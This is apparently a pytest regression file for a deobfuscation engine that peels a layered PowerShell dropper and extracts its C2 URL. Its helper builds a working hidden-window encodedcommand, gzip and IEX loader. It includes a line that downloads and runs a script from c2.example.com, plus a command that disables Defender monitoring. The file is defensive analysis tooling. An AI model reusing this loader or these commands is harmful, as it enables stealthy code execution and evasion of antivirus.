"""Regression Gate · Real-World -EncodedCommand Peel Chain (P4).

This test locks in the six-layer real-world PowerShell loader shape:

    cmd  →  powershell -nop -w hidden -encodedcommand <b64>
         →  UTF-16-LE decoded PowerShell script
         →  [Convert]::FromBase64String("H4sI...")
         →  gzip inflate
         →  IEX (final PowerShell / C2 URL)

Any future refactor that reintroduces the historical "OUTPUT = INPUT"
regression (regex missing intervening flags, utf-16-le alignment bug,
normalizer feedback loop, gzip inflate not firing on base64_decoded)
must fail this test.

Run:  cd /app/backend && python -m pytest tests/test_ps_encodedcommand_full_chain.py -v
"""
from __future__ import annotations

import base64
import gzip
import os
import sys

sys.path.insert(0, "/app/backend")
os.environ.setdefault("MONGO_URL", "mongodb://localhost:27017")
os.environ.setdefault("DB_NAME", "test_database")

from services.uaie              import plugins as _plugins_pkg
from services.uaie.orchestrator import Orchestrator


def _build_realworld_payload(inner_ps: str) -> bytes:
    """Wrap ``inner_ps`` in the classic
    ``cmd → powershell -encodedcommand → FromBase64String → gzip → IEX``
    loader shape that every real Empire / Nishang / Metasploit /
    Cobalt-Strike PowerShell dropper uses."""
    gz = gzip.compress(inner_ps.encode("utf-8"))
    gz_b64 = base64.b64encode(gz).decode()
    layer1 = (
        f"$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(\"{gz_b64}\"));"
        f"IEX (New-Object IO.StreamReader(New-Object IO.Compression."
        f"GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();"
    )
    enc_b64 = base64.b64encode(layer1.encode("utf-16-le")).decode()
    return (
        f"%COMSPEC% /b /c start /b /min powershell -nop -w hidden "
        f"-encodedcommand {enc_b64}"
    ).encode("utf-8")


# ─── T1 · The regex accepts intervening flags ────────────────────────
def test_encodedcommand_regex_allows_intervening_flags():
    """Historical bug: ``_ENC_CMD_RE`` used to require
    ``powershell -encodedcommand ...`` immediately.  Real payloads
    always ship ``-nop -w hidden`` etc between the exe and the flag."""
    from services.die.preprocessor.recursive_decoder import (
        _ENC_CMD_RE, _decode_ps_encoded_command,
    )
    payload = _build_realworld_payload("Write-Host hi").decode("utf-8")
    assert _ENC_CMD_RE.search(payload) is not None, (
        "regex must match payloads with intervening -nop -w hidden flags"
    )
    hit = _decode_ps_encoded_command(payload)
    assert hit is not None, "legacy decoder must peel the encoded_command"


# ─── T2 · Full 6-layer peel end-to-end via UAIE loop ─────────────────
def test_full_realworld_payload_peels_to_final_c2_url():
    """The exact shape reported in Feb 2026 as ``Notdecoded``."""
    inner_ps = ("Invoke-WebRequest -Uri http://c2.example.com/beacon.ps1 "
                 "-OutFile $env:TEMP\\a.ps1; . $env:TEMP\\a.ps1")
    payload = _build_realworld_payload(inner_ps)
    orch = Orchestrator(recognizers=_plugins_pkg.all_recognizers())
    result = orch.run(payload, root_type="cmd")

    # 1) Layer-1 peel: encoded_command → powershell artifact
    ps_arts = [a for a in result.artifacts.values()
                 if a.artifact_type == "powershell"
                 and a.discovered_by == "powershell.encoded_command"]
    assert ps_arts, "powershell.encoded_command must emit a child powershell artifact"

    # 2) Layer-2 peel: FromBase64String → base64_decoded (contains gzip magic)
    b64_arts = [a for a in result.artifacts.values()
                  if a.artifact_type == "base64_decoded"]
    assert b64_arts, "FromBase64String must emit a base64_decoded child"
    has_gzip_magic = any(b"1f8b0800" in a.payload[:60] for a in b64_arts)
    assert has_gzip_magic, "at least one base64_decoded artifact must carry gzip magic"

    # 3) The final C2 URL surfaces as evidence.
    urls = {e.value for e in result.evidence if e.kind == "url"}
    assert "http://c2.example.com/beacon.ps1" in urls, (
        f"final C2 URL must be extracted end-to-end.  "
        f"URLs seen: {urls}"
    )

    # 4) The C2 domain surfaces separately for OSINT enrichment.
    domains = {e.value for e in result.evidence if e.kind == "domain"}
    assert "c2.example.com" in domains, (
        f"C2 domain must be extracted.  Domains seen: {sorted(domains)}"
    )


# ─── T3 · No normalizer feedback loop (idempotency guard) ────────────
def test_no_normalizer_feedback_loop():
    """Historical bug: PS normalizers accepted their own output as
    input, cascading to 250+ near-identical ``powershell_normalized``
    artifacts and hitting the ``max_artifacts`` cap before the gzip
    peel could fire.  The orchestrator's same-type-as-parent guard
    prevents that."""
    inner_ps = "Write-Host hello"
    payload = _build_realworld_payload(inner_ps)
    orch = Orchestrator(recognizers=_plugins_pkg.all_recognizers())
    result = orch.run(payload, root_type="cmd")
    assert "max_artifacts" not in " ".join(result.warnings), (
        f"normalizer feedback loop reintroduced — max_artifacts hit.  "
        f"warnings: {result.warnings[:3]}"
    )
    ps_norm = [a for a in result.artifacts.values()
                 if a.artifact_type == "powershell_normalized"]
    assert len(ps_norm) < 40, (
        f"powershell_normalized artifact count out of control "
        f"({len(ps_norm)}) — feedback loop back."
    )


# ─── T4 · Structured skip-reason is emitted on the guard ─────────────
def test_same_type_as_parent_skip_reason_recorded():
    """When the idempotency guard fires, the ledger must record a
    ``skip_reason=same_type_as_parent`` so analysts can see WHY the
    cascade was stopped."""
    inner_ps = "Write-Host hello"
    payload = _build_realworld_payload(inner_ps)
    orch = Orchestrator(recognizers=_plugins_pkg.all_recognizers())
    result = orch.run(payload, root_type="cmd")
    skip_reasons = [e.output_summary for e in result.ledger
                      if e.action == "schedule_skip"
                      and "same_type_as_parent" in (e.output_summary or "")]
    # The guard may or may not fire depending on the specific payload,
    # but the skip_reason CODE must exist in the taxonomy and be usable.
    from services.uaie.ledger import format_skip_reason
    canonical = format_skip_reason("same_type_as_parent", "parent_type=x child_type=x")
    assert canonical.startswith("skip_reason=same_type_as_parent"), (
        "same_type_as_parent must be a first-class skip-reason code"
    )


# ─── T5 · Determinism (R28) across the full chain ────────────────────
def test_full_chain_is_deterministic():
    inner_ps = "Set-MpPreference -DisableRealtimeMonitoring $true"
    payload = _build_realworld_payload(inner_ps)
    r1 = Orchestrator(recognizers=_plugins_pkg.all_recognizers()).run(
        payload, root_type="cmd")
    r2 = Orchestrator(recognizers=_plugins_pkg.all_recognizers()).run(
        payload, root_type="cmd")
    def _fp(evs):
        return sorted((e.kind, str(e.value)[:200], e.source_capability,
                       tuple(e.mitre_techniques)) for e in evs)
    assert _fp(r1.evidence) == _fp(r2.evidence), (
        "6-layer real-world peel must be pure (R28)"
    )
